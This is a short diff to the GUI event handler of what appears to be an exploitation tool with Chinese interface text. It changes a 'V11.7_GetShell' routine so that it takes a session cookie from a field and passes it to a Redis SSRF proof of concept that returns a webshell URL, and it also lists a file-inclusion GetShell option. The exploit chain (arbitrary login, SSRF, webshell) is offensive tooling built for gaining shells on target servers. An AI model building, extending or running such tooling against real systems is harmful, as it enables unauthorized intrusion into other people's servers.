@@ -43,7 +43,6 @@ public class GetShellActionListener implements ActionListener {
                     textArea.append("\nCookie格式错误(示例:PHPSESSID=xxx)");
                     textArea.append("\n请点击获取Cookie自动获取或手动填充");
                 }
-
                 break;
             case "文件包含GetShell":
                 System.out.println("文件包含GetShell");
@@ -68,10 +67,9 @@ public class GetShellActionListener implements ActionListener {
                 break;
             case "V11.7_GetShell":
                 System.out.println("V11.7_GetShell");
-                textArea.append("\n*******\n正在尝试V11.7_GetShell...");
-                String cookie2 = ArbitraryUserLogin.poc5(url);
-                if (cookie2 != null) {
-                    shell_url = RedisSSRF.poc1(url, cookie2);
+                cookie = this.field_cookie.getText();
+                if (cookie != null) {
+                    shell_url = RedisSSRF.poc1(url, cookie, this.textArea);
                     if (shell_url != null) {
                         textArea.append("\n利用成功\nSHELL如下:\n" + shell_url);
                     } else {
